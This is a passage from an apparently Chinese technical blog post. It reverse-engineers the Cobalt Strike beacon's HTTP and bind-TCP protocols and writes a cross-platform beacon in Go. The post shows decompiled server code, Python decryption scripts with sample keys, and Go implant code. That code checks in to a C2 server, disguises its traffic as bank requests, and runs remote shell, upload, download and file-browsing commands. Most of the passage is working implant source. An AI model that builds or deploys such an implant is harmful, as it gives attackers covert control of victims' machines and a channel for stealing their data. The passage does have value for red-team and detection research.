        localeANSI := sysinfo.GetCodePageANSI()    localeOEM := sysinfo.GetCodePageOEM()    metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)  
        magicNum := sysinfo.GetMagicHead()    metaLen := WritePacketLen(metaInfo)    packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)    return packetToEncrypt}

  
封装完成之后，使用ts的公钥进行rsa加密：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func RsaEncrypt(origData []byte) ([]byte, error) {  
        block, _ := pem.Decode([]byte(config.RsaPublicKey))    if block == nil {        return nil, errors.New("public key error")    }    pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)    if err != nil {        return nil, err    }    pub := pubInterface.(*rsa.PublicKey)    return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)}

  
 **测试上线 ****  
**如上，我们使用golang语言按照cobaltstrike的封包格式和源数据格式进行组包封装，看是否能够上线。
首先配置profile的内容，包括回连地址，全局变量c2profile.go。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    var (    RsaPublicKey string = "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GN...-----END PUBLIC KEY-----"    C2 string = "***.**.***.**"    Port string = "**"    SSL bool = false    Sleep int = 2500    Jitter int = 500  
        GetPath string = "/api/getid"    GetPrepend int = 4    GetAppend int = 0  
        PostPath string = "/api/postid?s=1124&d_referer=http%3A%2F%2Fbank.pingan.com"    PostPrepend string = ".PNG"    PostAppend string = "")

  
配置http请求头

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    Getheader = req.Header{    "Cookie":"SESSIONID=%ENCDATA%",    "Accept":"*/*",    "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; NP06)",}  
    Postheader = req.Header{    "Cookie":"JSESSION=%ENCBEACONID%",    "Content-Type":"image/png",    "Accept":"*/*",    "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; NP06)",}

  
然后调用源数据组包函数，获得rsa加密的源数据，再进行http封包，最终发送给ts。

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    func FirstBlood() bool {    encryptedMetaInfo = EncryptedMetaInfo()//源数据封包并加密    for {        respBytes := HttpGet(config.GetUrl, encryptedMetaInfo)//http封包并发送        if respBytes != nil {            break        }        time.Sleep(time.Duration(config.Sleep) * time.Millisecond)    }    return true}

  
测试结果，成功上线：  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134447.png)  
  

 **1.2 下发Beacon的task数据**

  
上面介绍了beacon上线的通信数据，现在我们来看ts给beacon下发命令和执行结果返回的详细情况。  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134448.png)  
如上图是一次task下发到返回执行结果的过程：  
1\. beacon使用http get请求向ts发送上线数据的同时，获取ts返回的http get response即为封包的task任务数据。  
2\. 根据配置的profile信息，删除prepend data和append data得到AES加密的task数据。  
3\. AES解密task数据，并根据实际的task任务的类型执行相应的操作，并获得执行结果。  
4\. 将执行结果AES加密，并封包global key计算获得的HMAC，再进行base64编码。  
5\. 将执行结果封包后的数据加上prepend data和append data。  
6\. 最后进行http post数据封包，再发送给ts。  
 **1.2.1** **封装** **task** **任务数据 ****  
**当ts在收到http get请求之后，判断是否是beacon源数据返回之后就会查看ts的任务列表，如果有任
务，就会加密发送。decompiled_src/beacon/BeaconHTTP.java

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    BeaconEntry var7 = BeaconHTTP.this.controller.process_beacon_metadata(BeaconHTTP.this.listener, var5, CommonUtils.toBytes(var6), (String)null, 0); //解析http get返回的源数据if (var7 == null) {    MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);    return new byte[0];} else {    //获取beacon队列任务    byte[] var8 = BeaconHTTP.this.controller.dump(var7.getId(), 921600, 1048576);    //任务队列有任务    if (var8.length > 0) {        //加密任务数据        byte[] var9 = BeaconHTTP.this.controller.getSymmetricCrypto().encrypt(var7.getId(), var8);        return var9;    } else {        return new byte[0];    }}

  
跟进encrypt函数就是aes加密task任务数据。  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //var1 bid//var2 task任务数据（taskType+taskBuffer）public byte[] encrypt(String var1, byte[] var2) {    try {        if (!this.isReady(var1)) {            CommonUtils.print_error("encrypt: No session for '" + var1 + "'");            return new byte[0];        }  
            ByteArrayOutputStream var3 = new ByteArrayOutputStream(var2.length + 1024);        DataOutputStream var15 = new DataOutputStream(var3);        SecretKey var5 = this.getKey(var1); //获取对应beacon的AESkey        SecretKey var6 = this.getHashKey(var1);//获取对应beacon的hashmac        var3.reset();        var15.writeInt((int)(System.currentTimeMillis() / 1000L)); //写入时间戳        var15.writeInt(var2.length);    //写入task任务数据长度        var15.write(var2, 0, var2.length);        this.pad(var3);        Object var7 = null;        byte[] var16;        synchronized(this.in) {            var16 = this.do_encrypt(var5, var3.toByteArray()); //AES加密任务数据        }  
            Object var8 = null;        byte[] var17;        synchronized(this.mac) {            this.mac.init(var6);            var17 = this.mac.doFinal(var16); //hashmac        }  
            ByteArrayOutputStream var9 = new ByteArrayOutputStream();        var9.write(var16);//写入加密后的task数据        var9.write(var17, 0, 16);//写入hashmac        byte[] var10 = var9.toByteArray();        return var10;    } catch (InvalidKeyException var13) {        MudgeSanity.logException("encrypt failure for: " + var1, var13, false);        CommonUtils.print_error_file("resources/crypto.txt");        MudgeSanity.debugJava();        SecretKey var4 = this.getKey(var1);        if (var4 != null) {            CommonUtils.print_info("Key's algorithm is: '" + var4.getAlgorithm() + "' ivspec is: " + this.ivspec);        }    } catch (Exception var14) {        MudgeSanity.logException("encrypt failure for: " + var1, var14, false);    }  
        return new byte[0];}

  
然后是解析profile并添加prepend data和append data

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public void transform(Profile var1, Response var2, SmartBuffer var3) {      Iterator var4 = this.tsteps.iterator();  
          while(var4.hasNext()) {         Program.Statement var6 = (Program.Statement)var4.next();         String var5;         switch(var6.action) {         case 1:            var3.append(toBytes(var6.argument));//添加append data            break;         case 2:            var3.prepend(toBytes(var6.argument));//添加prepend data            break;         case 3:            var5 = Base64.encode(var3.getBytes());//base64编码数据            var3.clear();            var3.append(toBytes(var5));            break;         ...         }      }   }

  
 **1.2.2 task** **任务的数据格式 ****  
**根据上述过程，我们可以分析出task任务数据格式如下：  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134449.png)  
注意：task_buffer中包含：4字节的cmdbuffer_lenght和实际的cmdbuffer数据  
 **1.2.3** **使用** **python** **脚本测试解包 ****  
**这里我们先使用python脚本来验证，代码如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     '''cobaltstrike任务解密'''import hmacimport binasciiimport base64import struct  
    import hexdumpfrom Crypto.Cipher import AES  
    def compare_mac(mac, mac_verif):    if mac == mac_verif:        return True    if len(mac) != len(mac_verif):        print        "invalid MAC size"        return False  
        result = 0  
        for x, y in zip(mac, mac_verif):        result |= x ^ y  
        return result == 0  
      
    def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if not compare_mac(hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[0:16], signature):        print("message authentication failed")        return  
        cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    data = cypher.decrypt(encrypted_data)    return data  
      
    def readInt(buf):    return struct.unpack('>L', buf[0:4])[0]  
    #接收到的任务数据encData="0k6lSpOcdzWFzgaXLVIG3KScxMndHJzDRt//TUIqQSgtJdnQHkbXaatrNiizJJrj+9e4q7iHpPnaxEFMfRFluw=="  
    if __name__ == "__main__":    #key源自Beacon_metadata_RSA_Decrypt.py    SHARED_KEY = binascii.unhexlify("d8cc0d420a3ed27ab0de5033842164b8")    HMAC_KEY = binascii.unhexlify("578764fb028cfac24798926181720bd6")  
        enc_data = base64.b64decode(encData)    print("数据总长度:{}".format(len(enc_data)))    signature = enc_data[-16:]    encrypted_data = enc_data[:-16]  
        iv_bytes = bytes("abcdefghijklmnop",'utf-8')  
        dec = decrypt(encrypted_data,iv_bytes,signature,SHARED_KEY,HMAC_KEY)  
        counter = readInt(dec)    print("时间戳:{}".format(counter))  
        decrypted_length = readInt(dec[4:])    print("任务数据包长度:{}".format(decrypted_length))  
        data = dec[8:len(dec)]    print("任务Data")    print(hexdump.hexdump(data))  
        # 任务标志    Task_Sign=data[0:4]    print("Task_Sign:{}".format(Task_Sign))  
        # 实际的任务数据长度    Task_file_len = int.from_bytes(data[4:8], byteorder='big', signed=False)    print("Task_file:{}".format(Task_file_len))  
        with open('data.bin', 'wb') as f:        f.write(data[8:Task_file_len])  
        print(hexdump.hexdump(data[Task_file_len:]))

  
我们在cs中向beacon发送任务：  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134450.png)  
然后在beacon的机器上抓包获得封包的task数据。  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134451.png)  
然后根据profile，删除prepend和append。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    http-get {    set uri "/api/getid";    client {        header "Accept" "*/*";        metadata {            base64;            prepend "SESSIONID=";            header "Cookie";        }    }  
        server {        header "Server" "Pingan Frontend Proxy";        header "x-pingan-id" "wwvdT1M01kspYwKlmJIe0delKPUqYiRw6VYJKw9kekjO01FMl2QIStx=";        header "X-Frame-Options" "SAMEORIGIN";        header "Content-Type" "image/png";        output {           # mask;            base64;            prepend ".PNG";            print;        }    }}

  
得到加密的task数据为：

  * 

    
    
    o+oyO90IlE+K4pr0d8GbVLZMbra2I4Ty90OHrqeOE/+NXDqos8Wzp2f0Dp9TIrfS

  
然后使用python脚本解密。  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134452.png)  
如上可以看出taskType为：0x27，taskBuffer为空。  
 **1.2.4** **使用** **golang** **完成解包 ****  
**在使用Go语言开发跨平台的beacon时，在beacon返回源数据之后，就会进入循环定时获取task任务的过程，如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     ok := packet.FirstBlood()    if ok {        for {            time.Sleep(time.Duration(config.Sleep) * time.Millisecond)            respBytes := packet.PullCommand() //获取http get response数据            if respBytes != nil {                totalLen := len(respBytes)                //返回的数据必须要大于prepend+append的长度                if totalLen > config.GetAppend + config.GetPrepend {                    //respBytes := resp.Bytes()                    //删除prepend数据                    if config.GetPrepend !=0 {                        respBytes = respBytes[config.GetPrepend:]                    }                    //删除append数据                    if config.GetAppend !=0 {                        respBytes = respBytes[:len(respBytes) - config.GetAppend]                    }                    //decode base64                    decryptBytes, base64Err := base64.StdEncoding.DecodeString(string(respBytes))                    if base64Err != nil {                        fmt.Println("Exception: ",base64Err.Error())                        break                    }                    respBytes = decryptBytes  
                        //去除HashMac                    restBytes := respBytes[:len(respBytes)-crypt.HmacHashLen]                    //aes解密                    decrypted,decryptErr := packet.DecryptPacket(restBytes)                      if decryptErr != nil {                        fmt.Println("Exception: ",decryptErr.Error())                        break                    }  
                        //获取task数据的长度                    lenBytes := decrypted[4:8]                    packetLen := util.ReadInt(lenBytes)                    //获取task数据                    decryptedBuf := bytes.NewBuffer(decrypted[8:])                    for {                        if packetLen <= 0 {                            break                        }                        //解析task数据                        cmdType, cmdBuf, parseErr := packet.ParsePacket(decryptedBuf, &packetLen)                        //根据命令类型，执行相应操作                        ...                    }                }            }        }    }

  
  

 **1.3 Beacon返回的task任务数据**

  
 **1.3.1** **解析返回的** **task** **任务数据 ****  
**beacon执行完任务之后，加密返回的数据解析过程如下：  
  
1\. decompiled_src/beacon/BeaconHTTP.java，解析http post包

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public byte[] serve(String var1, String var2, Properties var3, Properties var4) {    try {        String var5 = "";        //获取远程地址        String var6 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);        //获取post数据        String var7 = BeaconHTTP.this.getPostedData(var4);        //根据profile在post数据中获取beaconid        var5 = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", var3, var4, var7, var1));        if (var5.length() == 0) {            CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");            MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);        } else {            //根据profile在post数据中获取post data            byte[] var8 = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", var3, var4, var7, var1));            //var5 beaconid            //var8 post data            if (var8.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(var5, var8)) {                MudgeSanity.debugRequest(".http-post.client.output", var3, var4, var7, var1, var6);            }        }    } catch (Exception var9) {        MudgeSanity.logException("beacon post handler", var9, false);    }  
        return new byte[0];}

  
2\. src/beacon/BeaconC2.java，检验数据包的长度并提取

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public boolean process_beacon_data(String var1, byte[] var2) {      try {         DataInputStream var3 = new DataInputStream(new ByteArrayInputStream(var2));  
             while(var3.available() > 0) {            //4 response长度            int var4 = var3.readInt(); //5904             //检验数据包长度            if (var4 > var3.available()) {               CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " exceeds " + var3.available() + " available bytes. [Received " + var2.length + " bytes]");               return false;            }  
                if (var4 <= 0) {               CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " is invalid. [Received " + var2.length + " bytes]");               return false;            }  
                byte[] var5 = new byte[var4];            var3.read(var5, 0, var4);  
                //var1 beaconid            //var5 response数据            this.process_beacon_callback(var1, var5);         }  
             var3.close();         return true;      } catch (Exception var6) {         MudgeSanity.logException("process_beacon_data: " + var1, var6, false);         return false;      }   }

  
3\. src/beacon/BeaconC2.java，解密数据包

  *   *   *   *   *   *   * 

    
    
    //解密beacon返回的数据，并将解密的数据传给主处理函数//beaconid//返回的aes加密后的数据（加密数据（counter+结果数据长度+结果数据）+16字节的hashmac）public void process_beacon_callback(String var1, byte[] var2) {    byte[] var3 = this.getSymmetricCrypto().decrypt(var1, var2);    this.process_beacon_callback_decrypted(var1, var3);}

  
src/dns/BaseSecurity.java

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //beacon返回的任务数据解密函数//var2 = aes加密的数据（counter+命令结果的长度+命令结果（命令类型+执行结果））+hashmacpublic byte[] decrypt(String var1, byte[] var2) {    try {        if (!this.isReady(var1)) {            CommonUtils.print_error("decrypt: No session for '" + var1 + "'");            return new byte[0];        } else {            Session var3 = this.getSession(var1);            SecretKey var4 = this.getKey(var1); //获取当前beacon的aeskey            SecretKey var5 = this.getHashKey(var1); //获取当前beacon对应的HashMac            byte[] var6 = Arrays.copyOfRange(var2, 0, var2.length - 16); //task任务返回的加密数据            byte[] var7 = Arrays.copyOfRange(var2, var2.length - 16, var2.length); //最后16字节是task任务返回的hashmac            Object var8 = null;            byte[] var18;            synchronized(this.mac) {                this.mac.init(var5);                var18 = this.mac.doFinal(var6);            }  
                byte[] var9 = Arrays.copyOfRange(var18, 0, 16);            //对比当前beacon存储的hashmac和task任务返回的hashmac            if (!MessageDigest.isEqual(var7, var9)) {                CommonUtils.print_error("[Session Security] Bad HMAC on " + var2.length + " byte message from Beacon " + var1);                return new byte[0];            } else {                Object var10 = null;                byte[] var19;                synchronized(this.out) {                    var19 = this.do_decrypt(var4, var6); //aes解密task任务返回的数据                }  
                    DataInputStream var11 = new DataInputStream(new ByteArrayInputStream(var19));                int var12 = var11.readInt();//counter                int var13 = var11.readInt();//命令结果数据的长度                if (var13 >= 0 && var13 <= var2.length) {                    byte[] var14 = new byte[var13];                    var11.readFully(var14, 0, var13); //从var11中读取var13长度的字节，放入进var14                    var3.counter = (long)var12;                    return var14; //返回任务结果类型+执行结果数据                } else {                    CommonUtils.print_error("[Session Security] Impossible message length: " + var13 + " from Beacon " + var1);                    return new byte[0];                }            }        }    } catch (Exception var17) {        var17.printStackTrace();        return new byte[0];    }}

  
4\. src/beacon/BeaconC2.java，解析执行结果数据

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public void process_beacon_callback_decrypted(String var1, byte[] var2) {      byte var3 = -1;      if (var2.length != 0) {         BeaconEntry var4 = this.getCheckinListener().resolve(var1 + "");         if (var4 == null) {            CommonUtils.print_error("entry is null for " + var1);         }  
             try {            DataInputStream var5 = new DataInputStream(new ByteArrayInputStream(var2));            //4 获取任务返回类型            int taskType = var5.readInt();            String var6;  
                //根据不同的返回结果执行相应的操作            ...            ...  
      
             } catch (IOException var13) {            MudgeSanity.logException("beacon callback: " + var3, var13, false);         }  
          }   }

  
 **1.3.2 task** **任务返回数据的格式 ****  
**根据上述解析过程，我们可以获取task任务返回的数据包的格式如下：  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134453.png)  
 **1.3.3** **使用** **python** **解析** **task** **任务返回的数据**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     '''Beacon任务执行结果解密'''import hmacimport binasciiimport base64import structimport hexdumpfrom Crypto.Cipher import AES  
    def compare_mac(mac, mac_verif):    if mac == mac_verif:        return True    if len(mac) != len(mac_verif):        print        "invalid MAC size"        return False  
        result = 0  
        for x, y in zip(mac, mac_verif):        result |= x ^ y  
        return result == 0  
    def HexToByte( hexStr ):    return bytes.fromhex(hexStr)  
    def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if not compare_mac(hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[0:16], signature):        print("message authentication failed")        return  
        cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    data = cypher.decrypt(encrypted_data)    return data  
    #key源自Beacon_metadata_RSA_Decrypt.pySHARED_KEY = binascii.unhexlify("7f13e5bcc4c6c5c7af06dc3143b0b88e")HMAC_KEY = binascii.unhexlify("b1179c03ea6cd3d4eb5054fa75332b0c")  
    encrypt_data=base64.b64decode("AAAAQPmxmlOwWb3bsWCXfcZJL5HJqg3HfMKEVuoGvTGOGB1Imr8hvN3n01GWoneTc3pm0tLFrWZC7QGoGvp7JfZOa1o=")#encrypt_data = HexToByte("0000075")encrypt_data_length=encrypt_data[0:4]  
    encrypt_data_length=int.from_bytes(encrypt_data_length, byteorder='big', signed=False)  
    encrypt_data_l = encrypt_data[4:len(encrypt_data)]  
    data1=encrypt_data_l[0:encrypt_data_length-16]signature=encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = bytes("abcdefghijklmnop",'utf-8')  
    dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)  
      
    counter = dec[0:4]counter=int.from_bytes(counter, byteorder='big', signed=False)print("counter:{}".format(counter))  
    dec_length = dec[4:8]dec_length=int.from_bytes(dec_length, byteorder='big', signed=False)print("任务返回长度:{}".format(dec_length))  
    de_data= dec[8:len(dec)]Task_type=de_data[0:4]Task_type=int.from_bytes(Task_type, byteorder='big', signed=False)print("任务输出类型:{}".format(Task_type))  
    print(binascii.b2a_hex(de_data[4:dec_length]))  
    print(hexdump.hexdump(dec))

  
使用上面测试task任务下发解包的过程一样，我们使用cs下发任务  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134454.png)  
在beacon所在的机器上抓包  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134455.png)  
然后根据profile，去除http post数据中的prepend和append数据

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    http-post {    set uri "/api/postid";    client {        header "Accept" "*/*";        header "Content-Type" "image/png";  
            id {            base64;            prepend "JSESSION=";            header "Cookie";        }        parameter "s" "1124";        parameter "d_referer" "http%3A%2F%2Fbank.pingan.com";  
            output {            base64;            prepend ".PNG";            print;        }    }  
        server {        header "Server" "Pingan Frontend Proxy";        header "x-pingan-id" "9zHYZzF8IlH7emm3GNdwPHVCnAo1gOxmo73O9JlwMsuP68pMKrSy17kS=";        header "X-Frame-Options" "SAMEORIGIN";  
            output {            base64;            print;        }    }}

  
得到实际的post data

  * 

    
    
    AAAAMOoMW516MwI6+UQGIx5LuEleeFVzVueZ10pEkAOLNHV3HUByBodgsliVpwUoEH1VgA== 

  
然后使用python脚本解析返回的数据  
![](https://gitee.com/fuli009/images/raw/master/public/20220218134456.png)  
 **1.3.4** **使用** **golang** **封包** **task** **返回的任务数据 ****  
**以执行pwd为例：  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
     func PWD(){    var finalPacket []byte = nil    pwd, err := os.Getwd()    result, err := filepath.Abs(pwd)    if err != nil {        finalPacket = packet.MakePacket(13,[]byte(err.Error()))    }else {        finalPacket = packet.MakePacket(19,[]byte(result))    }    packet.PushResult(finalPacket)}

  
1\. MakePacket封装send data

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func MakePacket(replyType int, b []byte) []byte {    config.Counter += 1    buf := new(bytes.Buffer)    counterBytes := make([]byte, 4)    binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))    buf.Write(counterBytes)  
        if b != nil {        resultLenBytes := make([]byte, 4)        resultLen := len(b) + 4        binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))        buf.Write(resultLenBytes)    }  
        replyTypeBytes := make([]byte, 4)    binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))    buf.Write(replyTypeBytes)  
        buf.Write(b)  
        encrypted, err := crypt.AesCBCEncrypt(buf.Bytes(), config.AesKey)    if err != nil {        return nil    }    // cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher    encrypted = encrypted[16:]  
        buf.Reset()  
        sendLen := len(encrypted) + crypt.HmacHashLen    sendLenBytes := make([]byte, 4)    binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))    buf.Write(sendLenBytes)  
        buf.Write(encrypted)  
        hmacHashBytes := crypt.HmacHash(encrypted)    buf.Write(hmacHashBytes)  
        return buf.Bytes()}

  
2\. PushResult封装http post

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func HttpPost(url string, data []byte) error {    httpRequest := req.New()    postString := base64.StdEncoding.EncodeToString(data)  
        for k,v := range config.Postheader{        if strings.Contains(v,"%ENCBEACONID%"){            config.Postheader[k] = strings.Replace(v, "%ENCBEACONID%", base64.StdEncoding.EncodeToString([]byte(strconv.Itoa(config.ClientID))), -1 )        }    }  
        if len(config.PostPrepend) !=0 {        postString = config.PostPrepend + postString    }    if len(config.PostAppend) !=0 {        postString = postString + config.PostAppend    }    resp, err := httpRequest.Post(url, postString, config.Postheader)    if err != nil {        fmt.Printf("[-] Post http data error: %s\n", err.Error())        return err    }  
        defer resp.Response().Body.Close()    if resp.Response().StatusCode != http.StatusOK {        fmt.Printf("[-] Post http response status code: %d\n", resp.Response().StatusCode)        return err    }    return nil}

  

 **0x02 跨平台http/https Beacon**

  

根据上面我们对cs的http/https
beacon的整个通信过程的研究，完全能自己编写一个跨平台的beacon，这里我们选择了golang作为开发语言，虽然编译之后很大，但是跨平台的性很好。  

  

但是我们想将Beacon的回连地址、加密的公钥以及profile的配置都编译到golang程序中，这样的话每次生成跨平台Beacon的时候都需要修改源代码然后再编译，所以我们在golang源码外层再进行了一次python封装，它的作用如下：

  

1\. 解析profile，并将相应的值填入golang源码中。

2\. 根据.cobaltstrike.beacon_keys计算公钥，并填入golang源代码中。

3\. 实现golang项目的交叉编译。具体的流程图设计如下：

![](https://gitee.com/fuli009/images/raw/master/public/20220218134457.png)

  

实现的部分代码如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func main() {    //初始化，包括：生成随机的beaconid、生成随机的global key(aes+hashmac)、创建get和post的url以及对应的header    config.InitC2Profile()    //组装和封装源数据，并循环向ts发送，直到成功    ok := packet.FirstBlood()    if ok {        for {            time.Sleep(time.Duration(config.Sleep) * time.Millisecond)//sleep时间            //获取命令数据            respBytes := packet.PullCommand()            if respBytes != nil {                totalLen := len(respBytes)                if totalLen > config.GetAppend + config.GetPrepend {                    //删除prepend                    if config.GetPrepend !=0 {                        respBytes = respBytes[config.GetPrepend:]                    }                    //删除append                    if config.GetAppend !=0 {                        respBytes = respBytes[:len(respBytes) - config.GetAppend]                    }                    //decode base64                    decryptBytes, base64Err := base64.StdEncoding.DecodeString(string(respBytes))                    if base64Err != nil {                        fmt.Println("Exception: ",base64Err.Error())                        continue                    }                    respBytes = decryptBytes  
                        //去除HashMac                    restBytes := respBytes[:len(respBytes)-crypt.HmacHashLen]                    //aes解密                    decrypted,decryptErr := packet.DecryptPacket(restBytes)                      if decryptErr != nil {                        fmt.Println("Exception: ",decryptErr.Error())                        continue                    }  
                        //读取命令数据                    lenBytes := decrypted[4:8]                    packetLen := util.ReadInt(lenBytes)                    decryptedBuf := bytes.NewBuffer(decrypted[8:])                    for {                        if packetLen <= 0 {                            break                        }                        //解析命令数据                        cmdType, cmdBuf, parseErr := packet.ParsePacket(decryptedBuf, &packetLen)                        if parseErr == nil{                            if cmdBuf != nil {                                var finalPacket []byte = nil                                //执行对应的命令                                switch cmdType {                                case config.CMD_TYPE_SHELL:                                    go command.Shell(cmdBuf)  
                                    case config.CMD_TYPE_UPLOAD_START: //10                                    go command.Upload(cmdBuf)  
                                    case config.CMD_TYPE_UPLOAD_LOOP: //67                                    go command.Upload(cmdBuf)  
                                    case config.CMD_TYPE_DOWNLOAD: //11                                    go command.Download(cmdBuf)  
                                    case config.CMD_TYPE_CD: //5                                    go command.CD(cmdBuf)  
                                    case config.CMD_TYPE_SLEEP: //4                                    sleep := util.ReadInt(cmdBuf[:4])                                    config.Sleep = int(sleep)  
                                    case config.CMD_TYPE_PWD: //39                                    go command.PWD()  
                                    case config.CMD_TYPE_EXIT:                                    go command.Exit()  
                                    case config.CMD_TYPE_PORTFWD:                                    finalPacket = packet.MakePacket(13,[]byte("Please use shell rportfwd command"))                                    packet.PushResult(finalPacket)  
                                    case config.CMD_TYPE_PORTFWD_STOP:                                    finalPacket = packet.MakePacket(13,[]byte("Please use shell rportfwd command"))                                    packet.PushResult(finalPacket)  
                                    case config.CMD_TYPE_CONNECT:                                    go command.Connect(cmdBuf)  
                                    case config.CMD_TYPE_CONNECT_LIVE:                                    go command.BeaconLive(cmdBuf)  
                                    case config.CMD_TYPE_UNLINK:                                    go command.Unlink(cmdBuf)  
                                    case config.CMD_TYPE_FILE_Browser:                                    go command.FileBrowser(cmdBuf)  
                                    default:                                    finalPacket = packet.MakePacket(13, []byte("Command not supported"))                                    packet.PushResult(finalPacket)                                }                            }                        }                    }                }            }        }    }}

  

 **0x03 Bind tcp Beacon通信过程**

  

了解了cs回连的http/https beacon的回连以及控制过程，我们再来看内网横向的Bind tcp beacon。

![](https://gitee.com/fuli009/images/raw/master/public/20220218134458.png)

  

 **3.1 解析bindtcp源数据**

  

任务返回类型为10的时候，表示返回的是connect的结果，解析代码在beacon/BeaconC2.java中。

  

这里调用的process_beacon_metadata函数解析源数据，和http/https
beacon解析源数据的过程一样。所以我们可以知道bindtcp beacon 上线包的格式如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    if (taskType == 10) { //beacon返回connect结果    childBeaconID = var5.readInt(); //子beacon id    var18 = var5.readInt(); //hint信息    rsaEncryptData = CommonUtils.bString(CommonUtils.readAll(var5)); //子beacon返回的rsa加密的源数据    BeaconEntry var9 = this.getCheckinListener().resolve(var1 + "");    //null    //父beacon的内网ip    //子beacon返回的rsa加密的源数据    //父beaconid    //hint    var10 = this.process_beacon_metadata((ScListener)null, var9.getInternal() + " ⚯⚯", CommonUtils.toBytes(rsaEncryptData), var1, var18);  
